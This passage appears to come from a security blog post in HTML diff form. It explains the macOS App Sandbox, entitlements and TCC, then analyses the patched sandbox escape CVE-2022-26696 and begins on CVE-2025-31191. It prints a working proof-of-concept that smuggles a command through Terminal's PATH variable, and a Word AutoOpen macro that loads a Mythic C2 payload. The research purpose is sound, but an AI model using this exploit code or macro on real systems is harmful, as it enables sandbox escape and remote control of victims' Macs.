+&lt;p&gt;When users double-click or use &lt;code&gt;open -a&lt;/code&gt;, the app runs as a child of &lt;code&gt;launchd&lt;/code&gt; (PID 1), making the process tree flat. On other OSes, you can trace which shell or terminal launched a program by following the PPID, but on macOS GUI launches, all apps appear as children of &lt;code&gt;launchd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Before macOS Ventura, you could run the executable directly without &lt;code&gt;open&lt;/code&gt;. But if not launched within a proper &lt;code&gt;launchd&lt;/code&gt; environment, macOS would SIGKILL the app to protect the App Sandbox and TCC.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp;amp; 
+$ ps -A -j | grep Calculator | grep -v grep&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When run directly, the parent was the shell, not &lt;code&gt;launchd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;For testing, I created a dummy &lt;code&gt;.app&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;mkdir -p ~/MyApp.app/Contents/MacOS
+&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;#!/bin/bash\nsleep 10&amp;apos;&lt;/span&gt; &amp;gt; ~/MyApp.app/Contents/MacOS/MyApp
+chmod +x ~/MyApp.app/Contents/MacOS/MyApp
+
+~/MyApp.app/Contents/MacOS/MyApp &amp;amp;
+ps -A -j | grep MyApp
+
+open -a MyApp
+ps -A -j | grep MyApp&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As expected, direct invocation makes it a terminal child while &lt;code&gt;open -a&lt;/code&gt; makes it a &lt;code&gt;launchd&lt;/code&gt; child.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;launchd&lt;/code&gt; also handles &lt;code&gt;LaunchAgents&lt;/code&gt; and &lt;code&gt;LaunchDaemons&lt;/code&gt; for background services, but we won&amp;#x2019;t cover that today. To be continued&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;.app&lt;/code&gt; described so far is just one of many types of bundles.&lt;/p&gt;
+&lt;p&gt;macOS has various bundle types, as shown below. (This is not a complete list.)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;.app&lt;/code&gt; &amp;#x2013; An application bundle that contains all the elements that make up an app.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.framework&lt;/code&gt; &amp;#x2013; A framework bundle that includes not only loadable code like &lt;code&gt;.dylib&lt;/code&gt; but also resources, version information, etc. (The entire framework bundle can be loaded using &lt;code&gt;dlopen()&lt;/code&gt;.)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.kext&lt;/code&gt; &amp;#x2013; A kernel extension bundle that acts as an extension module loaded directly into the macOS kernel. For security reasons, Apple is gradually restricting their use in the latest versions of macOS.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.plugin&lt;/code&gt; &amp;#x2013; Plugin bundles, which include extension modules loaded by the main application&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As such, bundles are not only used to run apps, but also serve as core components that support functional expansion and modularized structures across macOS. &lt;/p&gt;
+&lt;p&gt;If so, let&amp;#x2019;s move on~&lt;/p&gt;
+&lt;h2 id=&#34;1-App-Sandbox&#34;&gt;&lt;a href=&#34;#1-App-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;1. App Sandbox&#34;&gt;&lt;/a&gt;1. App Sandbox&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve seen that macOS apps are bundles. Now let&amp;#x2019;s see how apps are executed and restricted by the system.&lt;/p&gt;
+&lt;p&gt;The key concept today is the &lt;strong&gt;App Sandbox&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;Ideally, from a security standpoint, you&amp;#x2019;d never run untrusted code. But we install and run many apps, so macOS encloses each app in a &lt;strong&gt;sandbox&lt;/strong&gt;, restricting it within a &amp;#x201C;box&amp;#x201D; it can&amp;#x2019;t escape.&lt;/p&gt;
+&lt;p&gt;Sandboxed apps are denied by default.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Restriction&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;File system&lt;/td&gt;
+&lt;td&gt;No access to all files, including home directory&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Network&lt;/td&gt;
+&lt;td&gt;No internet or socket access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microphone/Camera&lt;/td&gt;
+&lt;td&gt;No direct access (requires TCC approval)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Photo library&lt;/td&gt;
+&lt;td&gt;No access (requires separate permission)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;System APIs&lt;/td&gt;
+&lt;td&gt;Blocked system calls, process control, etc.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Child processes&lt;/td&gt;
+&lt;td&gt;Can spawn, but children inherit the same sandbox limits&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;To avoid breaking essential features, some entitlements can be granted.&lt;/p&gt;
+&lt;p&gt;For example, an image editor needs to open/save files chosen by the user. A sandboxed app needs explicit exceptions for this, defined in its &lt;code&gt;Entitlements&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* &lt;code&gt;Entitlements&lt;/code&gt;: Permissions declared at code signing time, listing allowed capabilities.&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-1-What-are-Entitlements&#34;&gt;&lt;a href=&#34;#1-1-What-are-Entitlements&#34; class=&#34;headerlink&#34; title=&#34;1.1 What are Entitlements?&#34;&gt;&lt;/a&gt;1.1 What are Entitlements?&lt;/h3&gt;&lt;p&gt;Entitlements are declared in an XML-format &lt;code&gt;.entitlements&lt;/code&gt; file or set in Xcode under Signing &amp;amp; Capabilities.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Entitlement Key&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.network.client&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow network client access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.files.user-selected.read-write&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow read/write to user-selected files&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.assets.pictures.read-write&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow photo library read/write&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.device.camera&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow camera access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;In other words, the app cannot do anything by default, but can only operate within the permissions granted by the user.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Entitlements&lt;/code&gt; are typically written in XML format as &lt;code&gt;.entitlements&lt;/code&gt; files, and can be added visually in Xcode under the Target &amp;gt; Signing &amp;amp; Capabilities tab.&lt;/p&gt;
+&lt;p&gt;++  When using Sandbox, you must declare it as follows.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;com.apple.security.app-sandbox&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This key must be declared for macOS to run the app in sandbox mode.&lt;/p&gt;
+&lt;h3 id=&#34;1-2-TCC&#34;&gt;&lt;a href=&#34;#1-2-TCC&#34; class=&#34;headerlink&#34; title=&#34;1.2 TCC&#34;&gt;&lt;/a&gt;1.2 TCC&lt;/h3&gt;&lt;p&gt;You&amp;#x2019;ve seen messages like:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;#x201C;@@@&amp;#x201D; Would Like to Modify Apps on your Mac.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This prompt comes from macOS&amp;#x2019;s &lt;strong&gt;TCC&lt;/strong&gt; (Transparency, Consent, and Control). When an app attempts to access sensitive data, TCC forces an explicit user consent step, preventing unauthorized access.&lt;/p&gt;
+&lt;h2 id=&#34;2-Sandbox-Escape&#34;&gt;&lt;a href=&#34;#2-Sandbox-Escape&#34; class=&#34;headerlink&#34; title=&#34;2. Sandbox Escape&#34;&gt;&lt;/a&gt;2. Sandbox Escape&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve explored how strict the App Sandbox is. Can we bypass it to escape the sandbox?&lt;/p&gt;
+&lt;p&gt;Of course it&amp;#x2019;s not easy&amp;#x2014;macOS enforces strict access controls. But vulnerabilities have existed. Let&amp;#x2019;s analyze known macOS sandbox escape cases.&lt;/p&gt;
+&lt;h3 id=&#34;2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app&#34;&gt;&lt;a href=&#34;#2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app&#34; class=&#34;headerlink&#34; title=&#34;2.1 CVE-2022-26696: Sandbox Escape via Terminal.app&#34;&gt;&lt;/a&gt;2.1 CVE-2022-26696: Sandbox Escape via Terminal.app&lt;/h3&gt;&lt;p&gt;CVE-2022-26696 was a vulnerability that allowed sandboxed apps to escape the sandbox by setting &lt;strong&gt;specific environment variables&lt;/strong&gt; when running Terminal.app, causing Terminal to inherit that environment.&lt;/p&gt;
+&lt;p&gt;In Terminal&amp;#x2019;s code, &lt;code&gt;isRunningInInstallEnvironment()&lt;/code&gt; checks the &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; env var:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;+(char)isRunningInInstallEnvironment {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (*(int8_t *)byte_10010617c == 0x1) {
+        rax = *(int8_t *)byte_10010617b;
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        COND = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__OSINSTALL_ENVIRONMENT&amp;quot;&lt;/span&gt;) != 0x0;
+        rax = COND_BYTE_SET(NE);
+        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;
+        *(int8_t *)byte_10010617c = 0x1;
+    }
+    rax = sign_extend_64(rax);
+    &lt;span class=&#34;hljs-built_in&#34;&gt;return&lt;/span&gt; rax;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This checks whether the environment variable &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; is set internally, and if it is, Terminal determines that it is &lt;strong&gt;running in the BaseSystem environment&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* BaseSystem: Installation UI when booting from a macOS installation USB, macOS Recovery Mode, minimal system environment with BaseSystem.dmg mounted, etc.&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;-(void *)init {
+    var_30 = self;
+    *(&amp;amp;var_30 + 0x8) = *0x1000f4790;
+    rax = [[&amp;amp;var_30 super] init];
+    r14 = rax;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (rax != 0x0) {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (*qword_100105e38 == 0x0) {
+            *qword_100105e38 = r14;
+        }
+        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HOME&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LOGNAME&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SHELL&amp;quot;&lt;/span&gt;];
+        }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Within the &lt;code&gt;init&lt;/code&gt; function, if the value of isRunningInInstallEnvironment() is &lt;code&gt;NO&lt;/code&gt;, Terminal is designed to delete key environment variables such as &lt;code&gt;HOME&lt;/code&gt; and &lt;code&gt;PATH&lt;/code&gt;. However, if this value is YES, the environment variables are not deleted and remain unchanged. Ultimately, by setting the single environment variable __OSINSTALL_ENVIRONMENT=1, Terminal.app will run without deleting the environment variables. This allows sandboxed apps to execute shell commands by running Terminal.&lt;/p&gt;
+&lt;p&gt;By exploiting this vulnerability, you can achieve the desired results by performing the following actions within the sandbox app!&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Run Terminal.app with the &lt;code&gt;__OSINSTALL_ENVIRONMENT=1&lt;/code&gt; environment variable&lt;/li&gt;
+&lt;li&gt;Insert malicious commands into the &lt;code&gt;PATH&lt;/code&gt; environment variable &amp;#x2192; in the form of &lt;code&gt;$(malicious_command)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Terminal accepts and executes the environment variables as is&lt;/li&gt;
+&lt;li&gt;Execute malicious commands by bypassing the sandboxed app&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;void sbxWithShellCommand(NSString *&lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt;) {
+    FSRef appFSURL;
+    NSString *path = @&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&amp;quot;&lt;/span&gt;;
+    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;amp;appFSURL, NULL);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (stat2 &amp;lt; 0) {
+        NSLog(@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Something wrong: %d&amp;quot;&lt;/span&gt;,stat2);
+    }
+
+    LSApplicationParameters appParam;
+    appParam.version = 0;
+    appParam.flags = kLSLaunchDefaults;
+    appParam.application = &amp;amp;appFSURL;
+    appParam.argv = NULL;
+
+    // Pass the &lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt; to be executed as an environment variable.
+    NSString *finalCommand = [NSString stringWithFormat:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-subst&#34;&gt;$(%@)&lt;/span&gt;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt;];
+    NSDictionary *envs = @{@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;:finalCommand, @&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__OSINSTALL_ENVIRONMENT&amp;quot;&lt;/span&gt;:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;};
+    appParam.environment = (__bridge CFDictionaryRef)envs;
+    appParam.asyncLaunchRefCon = NULL;
+    appParam.initialEvent = NULL;
+
+    CFArrayRef array = (__bridge CFArrayRef)@[];
+    OSStatus &lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt; = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;amp;appParam, NULL, 0);
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt; &amp;lt; 0) {
+        NSLog(@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Something wrong: %d&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt;);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Apple&amp;#x2019;s &lt;a href=&#34;https://developer.apple.com/documentation/coreservices/launch_services&#34;&gt;&lt;strong&gt;LaunchServices API&lt;/strong&gt;&lt;/a&gt; &lt;code&gt;LSOpenURLsWithRole()&lt;/code&gt; is used to run Terminal, passing the shell command as an environment variable.&lt;/p&gt;
+&lt;p&gt;Additionally, this vulnerability could also be exploited within Microsoft Word macros!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;Sub AutoOpen()
+MacScript (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;do shell script &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&amp;apos;&lt;span class=&#34;hljs-subst&#34;&gt;$(/usr/bin/osascript -l JavaScript /path/.apfell.js)&lt;/span&gt;&amp;apos;&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)
+End Sub&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You can load the Mythic &lt;strong&gt;C2 JXA Payload&lt;/strong&gt; by including it in a macro in a Word document.&lt;/p&gt;
+&lt;p&gt;++ Apple has designated this vulnerability as &lt;code&gt;CVE-2022-26696&lt;/code&gt; and modified Terminal so that it no longer trusts the &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; environment variable.&lt;/p&gt;
+&lt;p&gt;I checked each function based on my terminal (v2.14).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It has been changed so that it not only filters environment variables, but also checks a wider range of security conditions and structurally initializes the internal state.&lt;/p&gt;
+&lt;p&gt;The structure that previously relied solely on &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; has been removed, and security has been strengthened so that Terminal only operates in a normal launchd environment. Additionally, Launch Services has been modified to recognize whether the &lt;strong&gt;XPC&lt;/strong&gt; client is in a sandboxed state.&lt;/p&gt;
+&lt;p&gt;[TTApplication init] code&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2)
+{
+  TTApplication *v2; // rax
+  TTApplication *v3; // rbx
+  id v4; // rax
+  id v5; // rax
+  id v6; // r14
+  void *v7; // rax
+  id v8; // rax
+  id v9; // rax
+  id v10; // rax
+  id v11; // rax
+  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF
+
+  v13.receiver = self;
+  v13.cls = &amp;amp;OBJC_CLASS___TTApplication;
+  v2 = (TTApplication *)objc_msgSendSuper2(&amp;amp;v13, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;init&amp;quot;&lt;/span&gt;);
+  v3 = v2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v2 )                                     // rax
+  {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !qword_1000FFE38 )
+      qword_1000FFE38 = v2;
+    v4 = objc_msgSend(&amp;amp;OBJC_CLASS___NSProcessInfo, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;processInfo&amp;quot;&lt;/span&gt;);
+    v5 = objc_msgSend(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;environment&amp;quot;&lt;/span&gt;);
+    v6 = objc_msgSend(v5, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mutableCopy&amp;quot;&lt;/span&gt;);
+    v7 = (void *)objc_opt_class(v3);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(unsigned __int8)objc_msgSend(v7, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;isRunningInInstallEnvironment&amp;quot;&lt;/span&gt;) )
+    {
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFD90);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HOME&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDB0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDD0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LOGNAME&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDF0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE10);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SHELL&amp;quot;&lt;/span&gt;
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (unsigned int)csr_check(2LL) )
+        objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE30);
+    }
+    objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE50);
+    objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE70);
+    v3-&amp;gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;copy&amp;quot;&lt;/span&gt;);
+    objc_release(v6);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setDelegate:&amp;quot;&lt;/span&gt;, v3);
+    v8 = objc_alloc(&amp;amp;OBJC_CLASS___NSMutableIndexSet);
+    v3-&amp;gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;initWithIndexesInRange:&amp;quot;&lt;/span&gt;, 1LL, 9LL);
+    v3-&amp;gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;amp;OBJC_CLASS___NSMutableDictionary);
+    v9 = objc_msgSend(&amp;amp;OBJC_CLASS___NSUserDefaults, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;standardUserDefaults&amp;quot;&lt;/span&gt;);
+    v10 = objc_msgSend(v9, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;objectForKey:&amp;quot;&lt;/span&gt;, off_1000FF878);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v10 )
+      objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setDefaultShell:&amp;quot;&lt;/span&gt;, v10);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addObserver:forKeyPath:options:context:&amp;quot;&lt;/span&gt;, v3, &amp;amp;off_1000CFE90, 11LL, &amp;amp;unk_1000A4548);
+    v11 = objc_msgSend(&amp;amp;OBJC_CLASS___NSNotificationCenter, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;defaultCenter&amp;quot;&lt;/span&gt;);
+    objc_msgSend(
+      v11,
+      &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addObserver:selector:name:object:&amp;quot;&lt;/span&gt;,
+      v3,
+      &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;handleWindowKeyChange:&amp;quot;&lt;/span&gt;,
+      NSWindowDidBecomeKeyNotification,
+      0LL);
+    v3-&amp;gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;amp;OBJC_CLASS___TTWorkspace);
+    objc_msgSend(&amp;amp;OBJC_CLASS___NSColor, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setIgnoresAlpha:&amp;quot;&lt;/span&gt;, 0LL);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;initLowSwapSpaceWatcher&amp;quot;&lt;/span&gt;);
+  }
+  &lt;span class=&#34;hljs-built_in&#34;&gt;return&lt;/span&gt; v3;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2-2-CVE&amp;#x2011;2025&amp;#x2011;31191-Security&amp;#x2011;Scoped-Bookmarks-based-Sandbox-Escape&#34;&gt;&lt;a href=&#34;#2-2-CVE&amp;#x2011;2025&amp;#x2011;31191-Security&amp;#x2011;Scoped-Bookmarks-based-Sandbox-Escape&#34; class=&#34;headerlink&#34; title=&#34;2.2 CVE&amp;#x2011;2025&amp;#x2011;31191: Security&amp;#x2011;Scoped Bookmarks based Sandbox Escape&#34;&gt;&lt;/a&gt;2.2 CVE&amp;#x2011;2025&amp;#x2011;31191: Security&amp;#x2011;Scoped Bookmarks based Sandbox Escape&lt;/h3&gt;&lt;p&gt;CVE-2025-31191 is based on a structural flaw that allowed sandboxed apps on macOS to exploit &lt;strong&gt;Security-Scoped Bookmarks&lt;/strong&gt; to access system resources without user approval.&lt;/p&gt;
+&lt;p&gt;In addition to CVE-2022-26696 discussed in Section 2.1, there were various other Launch Services-based vulnerabilities. Subsequently, Apple strengthened App Sandbox policies within Launch Services to prevent such vulnerabilities. XPC clients are now able to recognize whether they are in a sandboxed state, rendering past vulnerabilities such as &lt;strong&gt;CVE-2022-26706&lt;/strong&gt;, &lt;strong&gt;CVE-2021-30864&lt;/strong&gt;, and &lt;strong&gt;CVE-2022-26696&lt;/strong&gt; invalid.&lt;/p&gt;
+&lt;p&gt;These changes have also affected the Microsoft Office for macOS environment. Office apps are now configured to strictly follow macOS sandbox policies, making it difficult to attempt initial penetration using macros as before. However, we focused our analysis on the &lt;strong&gt;SSB (Security-Scoped Bookmark)&lt;/strong&gt; feature, which allows file access permissions to be stored like tokens, as it remains a potential threat.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Security-Scoped Bookmark?&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;macOS restricts app file access permissions for security reasons, and external files cannot be accessed without the user&amp;#x2019;s explicit approval. One of the representative features used for this purpose is &lt;strong&gt;Security-Scoped Bookmark&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This Bookmark allows users to store access permissions for specific files or directories like a token once they have granted access. Apps can then store this Bookmark and use it later to access files without requiring user approval again.&lt;/p&gt;
+&lt;p&gt;Two key VBA APIs related to this feature have been newly introduced in the Office environment for macOS.&lt;/p&gt;
+&lt;ul&gt;
